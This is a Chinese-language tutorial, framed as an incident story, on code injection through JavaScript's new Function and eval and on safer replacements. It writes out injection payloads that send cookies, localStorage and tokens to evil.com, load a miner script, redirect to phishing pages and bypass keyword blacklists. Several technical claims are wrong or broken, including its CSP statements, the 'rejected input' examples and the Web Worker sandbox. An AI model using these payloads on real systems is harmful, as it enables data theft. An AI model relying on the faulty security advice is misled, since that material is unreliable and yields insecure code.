《第73次记录：new Function —— 动态代码执行的潘多拉魔盒》

---

## 安全告警

周四上午十点，你正在review同事的PR，手机突然震动。安全团队负责人刘工发来紧急消息：

"立即停止'智能公式计算器'模块的部署！我们检测到严重的代码注入漏洞，攻击者可以执行任意JavaScript代码。"

你心里一沉，立刻打开安全监控平台。看到的日志让你脊背发凉：

```
[CRITICAL] 代码注入攻击检测
时间: 2024-11-07 10:03:42
来源IP: 203.0.113.45
攻击载荷:
  公式: '); window.location='http://evil.com?token='+document.cookie; //

[CRITICAL] 数据泄露尝试
时间: 2024-11-07 10:04:15
来源IP: 203.0.113.45
攻击载荷:
  公式: '); fetch('http://evil.com/collect', {method: 'POST', body: JSON.stringify(localStorage)}); //
```

"糟了！"你立刻找到'智能公式计算器'的代码，是实习生小王上周提交的feature:

```javascript
// calculator.js - 智能公式计算器
function calculateFormula(userFormula) {
    try {
        // 使用new Function动态执行用户输入的公式
        const compute = new Function('x', 'y', `return ${userFormula}`);

        // 示例：用户输入 "x + y * 2"
        // 生成函数：function(x, y) { return x + y * 2; }

        return compute;
    } catch (error) {
        throw new Error('公式语法错误');
    }
}

// 使用场景：用户自定义计算规则
const userInput = document.getElementById('formula').value;
const calculator = calculateFormula(userInput);

const result = calculator(10, 20); // 计算 10 + 20 * 2 = 50
```

"这段代码把用户输入直接传给`new Function`，完全没有验证！"你感到一阵眩晕。

你立刻拨通了刘工的电话："漏洞确认了，用户输入被直接用于构造函数体，攻击者可以注入任意代码。我马上回滚这个feature。"

"已经来不及了，"刘工的声音很严肃，"这个功能上线三天了，可能已经有用户数据被窃取。你现在立刻修复，我这边启动应急响应流程，通知所有用户修改密码。"

挂掉电话，你深吸一口气，开始分析这个致命漏洞的风险范围。

---

## 注入攻击

上午十点半，你在会议室向安全团队复现攻击过程：

**攻击场景1：数据窃取**

```javascript
// 用户界面：输入自定义公式
// 正常输入: x + y * 2
// 恶意输入:
'); fetch('http://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify({
        cookies: document.cookie,
        localStorage: localStorage,
        token: window.userToken
    })
}); //

// 生成的函数变成了:
function(x, y) {
    return ');
    fetch('http://evil.com/steal', {...});
    // x + y * 2  ← 被注释掉了
}
```

"看，攻击者用`');`闭合了return语句，然后注入自己的代码，最后用`//`注释掉剩余部分。"你指着屏幕说。

**攻击场景2：XSS攻击**

```javascript
// 恶意输入:
'); alert(document.cookie); //

// 生成的函数:
function(x, y) {
    return ');
    alert(document.cookie);
    // x + y * 2
}
```

**攻击场景3：重定向到钓鱼网站**

```javascript
// 恶意输入:
'); window.location='http://fake-login.com?redirect='+window.location.href; //

// 用户被重定向到钓鱼网站，诱导输入密码
```

**攻击场景4：挖矿脚本注入**

```javascript
// 恶意输入:
'); (function(){var s=document.createElement("script");s.src="http://evil.com/miner.js";document.body.appendChild(s)})(); //

// 在用户浏览器中运行挖矿脚本，消耗CPU资源
```

刘工看完演示，脸色铁青："这不仅仅是XSS,是完全的远程代码执行(RCE)。攻击者可以做任何事情。"

你点头："问题的根源是`new Function`和`eval`一样危险，都能执行任意代码。我们当初应该完全禁止使用它。"

"现在说这些没用，"刘工说，"你先评估影响范围，然后给我一个安全的修复方案。"

---

## 风险评估

上午十一点，你开始系统评估`new Function`的风险：

**风险点1：new Function vs eval**

```javascript
// eval - 在当前作用域执行代码
function testEval() {
    const x = 10;
    eval('console.log(x)'); // 可以访问x，输出10
    eval('var y = 20'); // 会污染当前作用域
    console.log(y); // 20 - 变量泄露了
}

// new Function - 在全局作用域执行代码
function testNewFunction() {
    const x = 10;
    const fn = new Function('console.log(typeof x)'); // undefined - 访问不到x
    fn();

    // 但可以访问全局变量
    window.globalVar = 'global';
    const fn2 = new Function('console.log(globalVar)');
    fn2(); // 'global'
}
```

"所以`new Function`比`eval`稍微安全一点，但本质上都能执行任意代码。"你在笔记上记录。

**风险点2：无法阻止的攻击向量**

```javascript
// 即使做了简单过滤也没用
function naiveFilter(userInput) {
    // 尝试过滤危险关键词
    const blacklist = ['eval', 'Function', 'setTimeout', 'fetch'];

    for (const keyword of blacklist) {
        if (userInput.includes(keyword)) {
            throw new Error('禁止使用敏感函数');
        }
    }

    return new Function('x', 'y', `return ${userInput}`);
}

// 绕过方式1: 使用字符串拼接
naiveFilter(''); window["ev"+"al"]("alert(1)"); //');

// 绕过方式2: 使用计算属性
naiveFilter(''); window[["eval"]]("alert(1)"); //');

// 绕过方式3: 使用全局对象
naiveFilter(''); globalThis.eval("alert(1)"); //');

// 绕过方式4: 构造函数
naiveFilter(''); (function(){}.constructor)("alert(1)")(); //');
```

"黑名单过滤完全无效，"你无奈地摇头，"只要能执行代码，就有无数种绕过方式。"

**风险点3：CSP也可能被绕过**

```javascript
// Content Security Policy 配置
<meta http-equiv="Content-Security-Policy"
      content="script-src 'self'">

// 这能阻止外部脚本加载，但不能阻止new Function
const evil = new Function('alert("CSP绕过!")');
evil(); // 依然能执行！

// 除非明确禁止unsafe-eval
<meta http-equiv="Content-Security-Policy"
      content="script-src 'self'; script-src-elem 'unsafe-inline'">
```

**风险点4：影响范围统计**

你查询了日志，统计出影响范围：

```
功能使用情况:
- 上线时间: 3天前
- 总用户访问: 15,234次
- 公式提交数: 4,521次
- 检测到的攻击尝试: 47次
- 可能成功的攻击: 12次

受影响用户估算:
- 直接受害者: ~500人
- 数据泄露风险: Cookie, localStorage, 用户Token
- 需要通知用户: 所有15,234个访问用户
```

"情况比想象的严重。"你把报告发给刘工。

---

## 安全方案

下午一点，你开始设计安全的替代方案。

**方案1：完全禁用动态代码执行**

```javascript
// ✗ 绝对不要用
function unsafeCalculate(formula) {
    return new Function('x', 'y', `return ${formula}`);
}

// ✗ 也不要用eval
function alsoUnsafe(formula) {
    return eval(formula);
}

// ✗ setTimeout/setInterval的字符串形式也不要用
setTimeout('alert(1)', 1000); // 危险!
setTimeout(() => alert(1), 1000); // 安全

// ESLint规则
{
    "rules": {
        "no-eval": "error",
        "no-implied-eval": "error",
        "no-new-func": "error"
    }
}
```

**方案2：使用安全的表达式解析器**

```javascript
// 使用专门的数学表达式解析器
import mathjs from 'mathjs';

function safeCalculate(formula) {
    try {
        // mathjs会解析并验证表达式，不会执行任意代码
        const parsed = mathjs.parse(formula);

        return function(x, y) {
            return parsed.evaluate({ x, y });
        };
    } catch (error) {
        throw new Error('公式语法错误');
    }
}

// 用户输入: x + y * 2
const calc = safeCalculate('x + y * 2');
console.log(calc(10, 20)); // 50

// 恶意输入会被拒绝
try {
    safeCalculate(''); alert(1); //');
} catch (e) {
    console.log('拒绝恶意输入'); // 安全!
}
```

**方案3：白名单 + 模板**

```javascript
// 只允许预定义的函数和操作符
const ALLOWED_OPERATORS = {
    '+': (a, b) => a + b,
    '-': (a, b) => a - b,
    '*': (a, b) => a * b,
    '/': (a, b) => a / b,
    '%': (a, b) => a % b,
    '**': (a, b) => a ** b
};

const ALLOWED_FUNCTIONS = {
    'abs': Math.abs,
    'sqrt': Math.sqrt,
    'max': Math.max,
    'min': Math.min,
    'round': Math.round
};

function safeEvaluate(expression, variables) {
    // 简单的解析器（生产环境建议使用成熟库）
    const tokens = tokenize(expression);
    return evaluate(tokens, variables, ALLOWED_OPERATORS, ALLOWED_FUNCTIONS);
}

// 用户可以使用白名单内的功能
safeEvaluate('x + y * 2', { x: 10, y: 20 }); // 50
safeEvaluate('sqrt(x) + abs(y)', { x: 16, y: -5 }); // 9

// 不在白名单内的会被拒绝
safeEvaluate('alert(1)', {}); // Error: 未知函数 alert
```

**方案4：沙箱隔离(iframe)**

```javascript
// 在隔离的iframe中执行代码
class SafeSandbox {
    constructor() {
        // 创建隔离的iframe
        this.iframe = document.createElement('iframe');
        this.iframe.sandbox = 'allow-scripts'; // 限制权限
        this.iframe.style.display = 'none';
        document.body.appendChild(this.iframe);
    }

    evaluate(code, timeout = 1000) {
        return new Promise((resolve, reject) => {
            const timeoutId = setTimeout(() => {
                reject(new Error('执行超时'));
            }, timeout);

            // 在iframe中执行代码
            this.iframe.contentWindow.postMessage({
                type: 'eval',
                code: code
            }, '*');

            window.addEventListener('message', function handler(event) {
                if (event.data.type === 'result') {
                    clearTimeout(timeoutId);
                    window.removeEventListener('message', handler);
                    resolve(event.data.value);
                }
            });
        });
    }

    destroy() {
        document.body.removeChild(this.iframe);
    }
}

// iframe内的接收代码
// sandbox-worker.html
window.addEventListener('message', (event) => {
    if (event.data.type === 'eval') {
        try {
            const result = eval(event.data.code);
            parent.postMessage({ type: 'result', value: result }, '*');
        } catch (error) {
            parent.postMessage({ type: 'error', message: error.message }, '*');
        }
    }
});
```

**方案5：最终实现 - 基于mathjs的安全计算器**

```javascript
// safe-calculator.js
import { create, all } from 'mathjs';

// 创建受限的math实例
const math = create(all);

// 移除危险函数
const dangerousFunctions = [
    'import', 'createUnit', 'evaluate',
    'parse', 'simplify', 'derivative'
];

dangerousFunctions.forEach(name => {
    delete math[name];
});

// 配置安全选项
math.config({
    number: 'number', // 使用原生数字
    epsilon: 1e-12
});

export class SafeCalculator {
    constructor() {
        this.allowedVariables = new Set(['x', 'y', 'z', 't']);
    }

    validateFormula(formula) {
        // 检查变量名
        const variables = this.extractVariables(formula);
        for (const variable of variables) {
            if (!this.allowedVariables.has(variable)) {
                throw new Error(`不允许的变量: ${variable}`);
            }
        }

        // 检查长度
        if (formula.length > 200) {
            throw new Error('公式过长');
        }

        // 检查特殊字符
        if (/[;{}()]/.test(formula) && !this.isValidParentheses(formula)) {
            throw new Error('包含非法字符');
        }
    }

    compile(formula) {
        this.validateFormula(formula);

        try {
            const compiled = math.compile(formula);

            return (variables) => {
                // 验证输入值
                for (const [key, value] of Object.entries(variables)) {
                    if (typeof value !== 'number' || !isFinite(value)) {
                        throw new Error(`无效的变量值: ${key}`);
                    }
                }

                const result = compiled.evaluate(variables);

                if (!isFinite(result)) {
                    throw new Error('计算结果无效');
                }

                return result;
            };
        } catch (error) {
            throw new Error(`公式编译失败: ${error.message}`);
        }
    }

    extractVariables(formula) {
        const matches = formula.match(/\b[a-z]\b/gi) || [];
        return new Set(matches);
    }

    isValidParentheses(formula) {
        const stack = [];
        for (const char of formula) {
            if (char === '(') stack.push(char);
            else if (char === ')') {
                if (stack.length === 0) return false;
                stack.pop();
            }
        }
        return stack.length === 0;
    }
}

// 使用示例
const calculator = new SafeCalculator();

// 安全的公式
const formula1 = calculator.compile('x + y * 2');
console.log(formula1({ x: 10, y: 20 })); // 50

const formula2 = calculator.compile('sqrt(x^2 + y^2)');
console.log(formula2({ x: 3, y: 4 })); // 5

// 恶意输入被拒绝
try {
    calculator.compile(''); alert(1); //');
} catch (e) {
    console.log('恶意输入被阻止:', e.message);
}

try {
    calculator.compile('eval("malicious")');
} catch (e) {
    console.log('危险函数被阻止:', e.message);
}
```

**方案6：CSP强化**

```html
<!-- index.html -->
<head>
    <!-- 强制CSP策略 -->
    <meta http-equiv="Content-Security-Policy"
          content="default-src 'self';
                   script-src 'self' 'unsafe-inline';
                   script-src-elem 'self';
                   object-src 'none';
                   base-uri 'self';">
</head>
```

```javascript
// 配置 CSP 报告
<meta http-equiv="Content-Security-Policy-Report-Only"
      content="default-src 'self'; report-uri /api/csp-report">

// 服务端接收CSP报告
app.post('/api/csp-report', (req, res) => {
    console.log('CSP违规:', req.body);
    // 记录到日志系统
    logSecurityEvent('CSP_VIOLATION', req.body);
    res.status(204).end();
});
```

下午四点，你完成了修复并重新部署。新版本使用mathjs库，完全移除了`new Function`的使用。

---

## 动态代码执行知识

晚上八点，你整理了关于动态代码执行的安全知识：

**规则 1: new Function构造函数**

`Function`构造函数可以从字符串创建函数：

```javascript
// 语法
const func = new Function([arg1, arg2, ...], functionBody);

// 示例
const add = new Function('a', 'b', 'return a + b');
console.log(add(2, 3)); // 5

// 等价于
function add(a, b) {
    return a + b;
}

// 多个参数可以用逗号分隔
const func1 = new Function('a', 'b', 'c', 'return a + b + c');

// 或者一次性传入
const func2 = new Function('a, b, c', 'return a + b + c');

// 无参数函数
const func3 = new Function('return 42');
```

**new Function的特性**:

```javascript
// 1. 在全局作用域执行
function outer() {
    const x = 10;
    const fn = new Function('return x'); // ReferenceError: x is not defined
}

// 2. 可以访问全局变量
window.globalVar = 'global';
const fn = new Function('return globalVar');
console.log(fn()); // 'global'

// 3. 每次调用都创建新函数
const fn1 = new Function('return 1');
const fn2 = new Function('return 1');
console.log(fn1 === fn2); // false
```

---

**规则 2: eval vs new Function**

两者都能执行字符串代码，但有重要区别：

```javascript
// eval: 在当前作用域执行
function testEval() {
    const x = 10;
    eval('var y = x + 5'); // 可以访问x
    console.log(y); // 15 - 可以访问eval中定义的变量
}

// new Function: 在全局作用域执行
function testFunction() {
    const x = 10;
    const fn = new Function('return x + 5'); // ReferenceError
}

// eval在严格模式下的特殊行为
'use strict';
function strictEval() {
    eval('var y = 10');
    console.log(typeof y); // 'undefined' - 严格模式下var不会泄露
}
```

**安全性对比**:

```javascript
// 两者都不安全，但new Function稍好一点
const userInput = '...恶意代码...';

// eval - 更危险
eval(userInput); // 可以访问和修改当前作用域的所有变量

// new Function - 稍微安全
new Function(userInput)(); // 只能访问全局作用域

// 结论：都不应该使用!
```

---

**规则 3: 代码注入的危害**

**攻击类型1：数据窃取**

```javascript
// 攻击载荷
const payload = `
    fetch('http://evil.com/steal', {
        method: 'POST',
        body: JSON.stringify({
            cookies: document.cookie,
            localStorage: {...localStorage},
            sessionStorage: {...sessionStorage}
        })
    });
`;

// 如果被执行
new Function(payload)(); // 数据被窃取
```

**攻击类型2：会话劫持**

```javascript
// 攻击载荷：窃取token并冒充用户
const payload = `
    const token = localStorage.getItem('authToken');
    fetch('http://evil.com/hijack', {
        method: 'POST',
        headers: { 'Authorization': 'Bearer ' + token }
    });
`;
```

**攻击类型3：钓鱼重定向**

```javascript
// 攻击载荷：重定向到钓鱼网站
const payload = `
    window.location = 'http://fake-login.com?return=' +
                      encodeURIComponent(window.location.href);
`;
```

**攻击类型4：蠕虫传播**

```javascript
// 攻击载荷：将恶意代码传播给其他用户
const payload = `
    const malicious = '...恶意代码...';
    fetch('/api/share', {
        method: 'POST',
        body: JSON.stringify({ content: malicious })
    });
`;
```

---

**规则 4: 安全的替代方案**

**方案1：使用专门的解析器库**

```javascript
// mathjs - 数学表达式
import { evaluate } from 'mathjs';
const result = evaluate('sqrt(x^2 + y^2)', { x: 3, y: 4 });

// expr-eval - 简单表达式
import { Parser } from 'expr-eval';
const parser = new Parser();
const expr = parser.parse('2 * x + 1');
console.log(expr.evaluate({ x: 3 })); // 7

// jexl - 复杂表达式
import jexl from 'jexl';
await jexl.eval('user.age > 18 && user.verified', {
    user: { age: 25, verified: true }
});
```

**方案2：白名单 + AST**

```javascript
// 使用acorn解析JavaScript
import * as acorn from 'acorn';

function safeEval(code, context) {
    // 解析AST
    const ast = acorn.parse(code, { ecmaVersion: 2020 });

    // 验证AST，只允许白名单中的节点
    const allowedNodeTypes = new Set([
        'Program', 'ExpressionStatement',
        'BinaryExpression', 'Identifier', 'Literal'
    ]);

    function validate(node) {
        if (!allowedNodeTypes.has(node.type)) {
            throw new Error(`不允许的节点类型: ${node.type}`);
        }

        for (const key in node) {
            if (typeof node[key] === 'object' && node[key]) {
                validate(node[key]);
            }
        }
    }

    validate(ast);

    // 使用沙箱执行
    return sandbox.evaluate(code, context);
}
```

**方案3：Web Worker隔离**

```javascript
// 在Web Worker中执行代码
class SafeWorkerEvaluator {
    constructor() {
        const workerCode = `
            self.onmessage = function(e) {
                try {
                    const result = Function('"use strict"; return (' + e.data.code + ')')();
                    self.postMessage({ success: true, result });
                } catch (error) {
                    self.postMessage({ success: false, error: error.message });
                }
            };
        `;

        const blob = new Blob([workerCode], { type: 'application/javascript' });
        this.worker = new Worker(URL.createObjectURL(blob));
    }

    evaluate(code, timeout = 5000) {
        return new Promise((resolve, reject) => {
            const timer = setTimeout(() => {
                this.worker.terminate();
                reject(new Error('执行超时'));
            }, timeout);

            this.worker.onmessage = (e) => {
                clearTimeout(timer);
                if (e.data.success) {
                    resolve(e.data.result);
                } else {
                    reject(new Error(e.data.error));
                }
            };

            this.worker.postMessage({ code });
        });
    }
}
```

---

**规则 5: Content Security Policy (CSP)**

**CSP配置**:

```html
<!-- 禁止eval和new Function -->
<meta http-equiv="Content-Security-Policy"
      content="script-src 'self'">

<!-- 允许inline script，但禁止eval -->
<meta http-equiv="Content-Security-Policy"
      content="script-src 'self' 'unsafe-inline'">

<!-- 使用nonce -->
<meta http-equiv="Content-Security-Policy"
      content="script-src 'nonce-{random}'">
<script nonce="{random}">
    // 这个脚本可以执行
</script>

<!-- 报告违规 -->
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; report-uri /api/csp-report">
```

**检测CSP违规**:

```javascript
// 监听CSP违规
document.addEventListener('securitypolicyviolation', (e) => {
    console.log('CSP违规:', {
        violatedDirective: e.violatedDirective,
        blockedURI: e.blockedURI,
        originalPolicy: e.originalPolicy
    });

    // 上报到服务器
    fetch('/api/csp-violation', {
        method: 'POST',
        body: JSON.stringify({
            directive: e.violatedDirective,
            uri: e.blockedURI,
            userAgent: navigator.userAgent
        })
    });
});
```

---

**规则 6: 防御最佳实践**

**实践1：完全禁用动态代码执行**

```javascript
// .eslintrc.js
module.exports = {
    rules: {
        'no-eval': 'error',
        'no-implied-eval': 'error',
        'no-new-func': 'error',
        'no-script-url': 'error'
    }
};

// 在代码中检测
if (typeof eval === 'function') {
    console.warn('eval可用，存在安全风险');
}
```

**实践2：输入验证和输出编码**

```javascript
// 输入验证
function validateUserInput(input) {
    // 长度限制
    if (input.length > 1000) {
        throw new Error('输入过长');
    }

    // 字符白名单
    if (!/^[a-zA-Z0-9\s\+\-\*\/\(\)\.]+$/.test(input)) {
        throw new Error('包含非法字符');
    }

    return input;
}

// 输出编码
function escapeHTML(str) {
    return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;');
}
```

**实践3：使用iframe沙箱**

```html
<!-- 限制iframe权限 -->
<iframe sandbox="allow-scripts allow-same-origin"
        src="sandbox.html">
</iframe>

<!-- 更严格的限制 -->
<iframe sandbox="allow-scripts"
        src="sandbox.html">
</iframe>
```

**实践4：监控和日志**

```javascript
// 记录所有动态代码执行尝试
const originalFunction = Function;

window.Function = function(...args) {
    console.warn('检测到Function构造函数调用:', args);

    // 记录到安全日志
    logSecurityEvent('DYNAMIC_CODE_EXECUTION', {
        args,
        stack: new Error().stack
    });

    // 阻止执行
    throw new Error('动态代码执行已被禁止');
};
```

---

周五上午，安全审计通过了新的实现。刘工说："这次是深刻的教训。`new Function`和`eval`应该被视为绝对禁止使用的API，就像`document.write`一样。"

你点头同意："我已经在团队编码规范里明确禁止了，并且配置了ESLint规则强制检查。以后不会再犯这种错误了。"

"安全无小事，"刘工总结道，"永远不要相信用户输入，永远不要动态执行代码。"

---

**事故档案编号**: FUNC-2024-1873
**影响范围**: 代码注入,远程代码执行,数据泄露,XSS攻击
**根本原因**: 使用new Function动态执行用户输入,缺少输入验证,未配置CSP,安全意识不足
**修复成本**: 高(紧急修复+数据泄露应急响应+用户通知),声誉损失严重

这是JavaScript世界第73次被记录的动态代码执行事故。`new Function`构造函数可以从字符串创建和执行函数,与`eval`类似但在全局作用域执行。两者都存在严重的安全风险——代码注入、远程代码执行、数据窃取、XSS攻击。攻击者可以通过恶意输入执行任意JavaScript代码,窃取Cookie、Token、LocalStorage等敏感数据,甚至完全控制用户会话。安全的替代方案包括:使用专门的表达式解析器(mathjs、expr-eval)、白名单+AST验证、Web Worker/iframe沙箱隔离、强化CSP策略。现代JavaScript开发应完全禁止使用`eval`、`new Function`、`setTimeout(string)`等动态代码执行API,通过ESLint规则和代码审查强制执行。

---
